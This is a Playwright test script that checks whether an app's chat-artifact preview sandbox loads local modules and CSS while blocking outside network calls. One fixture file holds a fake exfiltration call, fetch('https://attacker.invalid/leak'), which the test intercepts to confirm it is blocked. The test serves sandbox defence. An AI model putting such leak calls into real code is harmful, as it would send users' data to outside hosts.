import assert from 'node:assert/strict';
import { chromium } from 'playwright-core';

const baseURL = process.env.SIS_BASE_URL;
if (!baseURL) throw new Error('Set SIS_BASE_URL to an isolated running application.');
const browser = await chromium.launch({ channel: 'chrome', headless: true });
const page = await browser.newPage();
const project = `preview-project-${Date.now()}`;
const files = {
  'index.html':
    '<!doctype html><html><head><link rel="stylesheet" href="./style.css"><script type="importmap">{"imports":{"three":"/vendor/three/build/three.module.js"}}</script><script type="module" src="./main.js"></script></head><body><output id="result">Loading</output></body></html>',
  'style.css': 'body { background-color: rgb(12, 34, 56); }',
  'dependency.js': "export const value = 'Local module loaded';",
  'main.js':
    "import {value} from './dependency.js'; import * as THREE from 'three'; document.querySelector('#result').textContent=value; document.body.dataset.three=THREE.REVISION; fetch('https://attacker.invalid/leak').catch(()=>{document.body.dataset.network='blocked'});",
};
let externalRequests = 0;
await page.route('https://attacker.invalid/**', (route) => {
  externalRequests++;
  return route.abort();
});
try {
  await page.goto(baseURL, { waitUntil: 'domcontentloaded' });
  await page.waitForFunction(() => window.__sisWorkspaceReady && window.loadHeroArtifact);
  for (const [filename, content] of Object.entries(files)) {
    const response = await page.request.post(`${baseURL}/api/workspace/file`, {
      data: { path: `${project}/${filename}`, content },
    });
    assert.equal(response.ok(), true, await response.text());
  }
  await page.evaluate(
    (name) =>
      window.loadHeroArtifact({ url: `/workspace/${name}/index.html`, filename: 'index.html' }),
    project,
  );
  const card = page.locator('.chat-artifact').last();
  await card.getByText(/may navigate to external sites/).waitFor();
  assert.equal(await card.locator('iframe').getAttribute('src'), null);
  assert.equal(await card.locator('iframe').isHidden(), true);
  await card.getByRole('button', { name: 'Open project preview' }).click();
  const frame = card.locator('iframe').contentFrame();
  await frame.locator('#result').filter({ hasText: 'Local module loaded' }).waitFor();
  await frame.locator('body[data-network="blocked"]').waitFor();
  assert.ok(await frame.locator('body').getAttribute('data-three'));
  assert.equal(
    await frame.locator('body').evaluate((body) => getComputedStyle(body).backgroundColor),
    'rgb(12, 34, 56)',
  );
  assert.equal(externalRequests, 0);
  assert.match(
    await card.locator('.chat-artifact-status').innerText(),
    /Network access restricted/,
  );
  console.log('Main app loaded scoped local modules and CSS while blocking external fetch.');
} finally {
  for (const filename of Object.keys(files))
    await page.request
      .delete(`${baseURL}/api/workspace/file`, { data: { path: `${project}/${filename}` } })
      .catch(() => {});
  await browser.close();
}
